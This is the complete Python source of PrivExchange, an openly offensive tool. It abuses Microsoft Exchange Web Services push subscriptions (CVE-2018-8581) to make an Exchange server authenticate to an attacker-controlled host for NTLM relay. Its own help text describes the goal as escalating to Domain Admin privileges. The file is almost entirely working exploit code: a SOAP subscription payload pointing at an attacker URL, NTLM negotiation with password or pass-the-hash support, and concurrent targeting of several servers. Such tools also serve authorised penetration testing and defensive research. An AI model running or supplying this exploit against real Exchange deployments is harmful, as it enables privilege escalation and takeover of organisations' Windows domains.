#! /usr/bin/env python3

####################
#
# Copyright (c) 2019 Dirk-jan Mollema
#
# Minor fixes by @byt3bl33d3r
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
####################

import ssl
import argparse
import logging
import sys
import getpass
import base64
import re
import binascii
import concurrent.futures
import xml.etree.ElementTree as ET
from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
from impacket import ntlm


# SOAP request for EWS
# Source: https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/subscribe-operation
# Credits: https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange
POST_BODY = '''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
   <soap:Header>
      <t:RequestServerVersion Version="Exchange{}" />
   </soap:Header>
   <soap:Body >
      <m:Subscribe>
         <m:PushSubscriptionRequest SubscribeToAllFolders="true">
            <t:EventTypes>
              <t:EventType>NewMailEvent</t:EventType>
              <t:EventType>ModifiedEvent</t:EventType>
              <t:EventType>MovedEvent</t:EventType>
            </t:EventTypes>
            <t:StatusFrequency>1</t:StatusFrequency>
            <t:URL>{}</t:URL>
         </m:PushSubscriptionRequest>
      </m:Subscribe>
   </soap:Body>
</soap:Envelope>
'''

EXCHANGE_VERSIONS = ["2010_SP1","2010_SP2","2013","2016"]

def do_privexchange(host, attacker_url):
    # Init connection
    if not args.no_ssl:
        # HTTPS = default
        port = 443 if not args.exchange_port else int(args.exchange_port)
        uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        uv_context.verify_mode = ssl.CERT_NONE
        session = HTTPSConnection(host, port, timeout=args.timeout, context=uv_context)
    else:
        # Otherwise: HTTP
        port = 80 if not args.exchange_port else int(args.exchange_port)
        session = HTTPConnection(host, port, timeout=args.timeout)

    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(args.attacker_host, domain=args.domain)

    #Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    # Source: https://github.com/thezdi/PoC/blob/master/CVE-2018-8581/Exch_EWS_pushSubscribe.py
    headers = {
        "Authorization": 'NTLM {}'.format(negotiate),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "ExchangeServicesClient/0.0.0.0",
        "Translate": "F"
    }

    session.request("POST", ews_url, POST_BODY.format(args.exchange_version, attacker_url), headers)

    res = session.getresponse()
    res.read()

    # Copied from ntlmrelayx httpclient.py
    if res.status != 401:
        logging.info('Status code returned: {}. Authentication does not seem required for URL'.format(res.status))
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            logging.error('NTLM Auth not offered by URL, offered protocols: {}'.format(res.getheader('WWW-Authenticate')))
            return False
    except (KeyError, TypeError):
        logging.error('No authentication requested by the server for url {}'.format(ews_url))
        return False

    logging.debug('Got 401, performing NTLM authentication')
    # Get negotiate data
    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        logging.error('No NTLM challenge returned from server')
        return

    if args.hashes:
        lm_hash_h, nt_hash_h = args.hashes.split(':')
        # Convert to binary format
        lm_hash = binascii.unhexlify(lm_hash_h)
        nt_hash = binascii.unhexlify(nt_hash_h)
        args.password = ''
    else:
        nt_hash = ''
        lm_hash = ''

    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, args.user, args.password, args.domain, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())

    headers = {
        "Authorization": 'NTLM {}'.format(auth),
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "ExchangeServicesClient/0.0.0.0",
        "Translate": "F"
    }

    session.request("POST", ews_url, POST_BODY.format(args.exchange_version, attacker_url), headers)
    res = session.getresponse()

    logging.debug('HTTP status: {}'.format(res.status))
    body = res.read()
    logging.debug('Body returned: {}'.format(body))
    if res.status == 200:
        logging.info('Exchange returned HTTP status 200 - authentication was OK')
        # Parse XML with ElementTree
        root = ET.fromstring(body)
        code = None
        for response in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseCode'):
            code = response.text
        if not code:
            logging.error('Could not find response code element in body: {}'.format(body))
            return
        if code == 'NoError':
            logging.info('API call was successful')
        elif code == 'ErrorMissingEmailAddress':
            logging.error('The user you authenticated with does not have a mailbox associated. Try a different user.')
        else:
            logging.error('Unknown error {}'.format(code))
            for errmsg in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseMessages'):
                logging.error('Server returned: %s', errmsg.text)
        # Detect Exchange 2010
        for versioninfo in root.iter('{http://schemas.microsoft.com/exchange/services/2006/types}ServerVersionInfo'):
            if int(versioninfo.get('MajorVersion')) == 14:
                logging.info('Exchange 2010 detected. This version is not vulnerable to PrivExchange.')
    elif res.status == 401:
        logging.error('Server returned HTTP status 401 - authentication failed')
    else:
        if res.status == 500:
            if 'ErrorInvalidServerVersion' in body:
                logging.error('Server does not accept this Exchange dialect, specify a different Exchange version with --exchange-version')
                return
        else:
            logging.error('Server returned HTTP {}: {}'.format(res.status, body))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Exchange your privileges for Domain Admin privs by abusing Exchange. Use me with ntlmrelayx')
    parser.add_argument("hosts", nargs='+', type=str, metavar='HOSTNAME', help="Hostname(s)/ip(s) of the Exchange server")
    parser.add_argument("-u", "--user", metavar='USERNAME', help="username for authentication")
    parser.add_argument("-d", "--domain", metavar='DOMAIN', help="domain the user is in (FQDN or NETBIOS domain name)")
    parser.add_argument("-t", "--timeout", default=10, type=int, metavar="TIMEOUT", help="HTTP(s) connection timeout (Default: 10 seconds)")
    parser.add_argument("-p", "--password", metavar='PASSWORD', help="Password for authentication, will prompt if not specified and no NT:NTLM hashes are supplied")
    parser.add_argument('--hashes', action='store', help='LM:NLTM hashes')
    parser.add_argument("--no-ssl", action='store_true', help="Don't use HTTPS (connects on port 80)")
    parser.add_argument("--exchange-port", help="Alternative EWS port (default: 443 or 80)")
    parser.add_argument("-ah", "--attacker-host", required=True, help="Attacker hostname or IP")
    parser.add_argument("-ap", "--attacker-port", default=80, help="Port on which the relay attack runs (default: 80)")
    parser.add_argument("-ev", "--exchange-version", choices=EXCHANGE_VERSIONS, default="2013", help="Exchange dialect version (Default: 2013)")
    parser.add_argument("--attacker-page", default="/privexchange/", help="Page to request on attacker server (default: /privexchange/)")
    parser.add_argument("--debug", action='store_true', help='Enable debug output')
    args = parser.parse_args()

    ews_url = "/EWS/Exchange.asmx"

    # Init logging
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    stream = logging.StreamHandler(sys.stderr)
    stream.setLevel(logging.DEBUG)
    formatter = logging.Formatter('%(levelname)s: %(message)s')
    stream.setFormatter(formatter)
    logger.addHandler(stream)

    # Should we log debug stuff?
    if args.debug is True:
        logger.setLevel(logging.DEBUG)

    if args.password is None and args.hashes is None:
        args.password = getpass.getpass()

    # Construct attacker url
    attacker_url = 'http://{}{}'.format(args.attacker_host, args.attacker_page)
    if args.attacker_port != 80:
        attacker_url = 'http://{}:{}{}'.format(args.attacker_host, int(args.attacker_port), args.attacker_page)

    logging.info('Using attacker URL: {}'.format(attacker_url))

    with concurrent.futures.ThreadPoolExecutor(max_workers=len(args.hosts)) as executor:
        tasks = {executor.submit(do_privexchange, host, attacker_url): host for host in args.hosts}

        for future in concurrent.futures.as_completed(tasks):
            url = tasks[future]
            try:
                future.result()
            except Exception as e:
                logging.error("Got exception for host {}: {}".format(url, e))
